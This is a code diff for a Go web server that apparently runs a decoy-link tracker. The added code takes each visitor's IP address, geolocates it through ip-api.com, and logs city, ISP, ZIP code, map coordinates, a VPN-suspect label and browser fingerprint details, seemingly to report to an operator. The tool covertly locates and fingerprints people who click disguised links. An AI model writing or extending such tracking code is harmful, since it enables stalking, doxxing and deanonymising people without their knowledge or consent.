@@ -24,6 +24,25 @@ func safeString(val interface{}) string {
 	return fmt.Sprintf("%v", val)
 }
 
+func getIP(c *gin.Context) string {
+	ip := c.ClientIP()
+	if forwarded := c.Request.Header.Get("X-Forwarded-For"); forwarded != "" {
+		ip = strings.Split(forwarded, ",")[0]
+	}
+	return ip
+}
+
+func fetchGeoInfo(ip string) map[string]interface{} {
+	resp, err := http.Get("http://ip-api.com/json/" + ip)
+	if err != nil {
+		return map[string]interface{}{}
+	}
+	defer resp.Body.Close()
+	var geo map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&geo)
+	return geo
+}
+
 type LinkData struct {
 	DecoyURL string `json:"decoyUrl"`
 }
@@ -86,7 +105,10 @@ func trackDeepData(c *gin.Context) {
 		return
 	}
 
-	geoJSON, _ := json.Marshal(data.Geo)
+	ip := getIP(c)
+	geo := fetchGeoInfo(ip)
+
+	geoJSON, _ := json.Marshal(geo)
 	geoStr := string(geoJSON)
 	vpnSuspect := strings.Contains(geoStr, "Cloud") || strings.Contains(geoStr, "Relay") || strings.Contains(geoStr, "Apple") || strings.Contains(geoStr, "Hosting")
 	vpnLabel := ""
@@ -95,16 +117,17 @@ func trackDeepData(c *gin.Context) {
 	}
 
 	entry := fmt.Sprintf("\n\n✅ Deep Tracking\nID: %s\nDuration: %dms\nFingerprint: %+v\nGeo: %+v\nEvents: %d\n-----------\n",
-		data.ID, data.Duration, data.Fingerprint, data.Geo, len(data.Events))
+		data.ID, data.Duration, data.Fingerprint, geo, len(data.Events))
 
 	f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer f.Close()
 	f.WriteString(entry)
 
-	geoSummary := fmt.Sprintf("\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%s,%s",
-		safeString(data.Geo["city"]), safeString(data.Geo["country"]), safeString(data.Geo["countryCode"]),
-		safeString(data.Geo["isp"]), safeString(data.Geo["regionName"]), safeString(data.Geo["org"]), safeString(data.Geo["zip"]),
-		safeString(data.Geo["lat"]), safeString(data.Geo["lon"]))
+	geoSummary := fmt.Sprintf("\nIP: %s\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%s,%s",
+		ip,
+		safeString(geo["city"]), safeString(geo["country"]), safeString(geo["countryCode"]),
+		safeString(geo["isp"]), safeString(geo["regionName"]), safeString(geo["org"]), safeString(geo["zip"]),
+		safeString(geo["lat"]), safeString(geo["lon"]))
 
 	fp := data.Fingerprint
 	fpDetails := fmt.Sprintf("\n\n🧠 *Fingerprint Info:*\nUser-Agent: `%s`\nPlatform: `%s`\nLang: `%s`\nScreen: `%s`\nTouch: `%v`\nDNT: `%v`\nTimezone: `%s`",
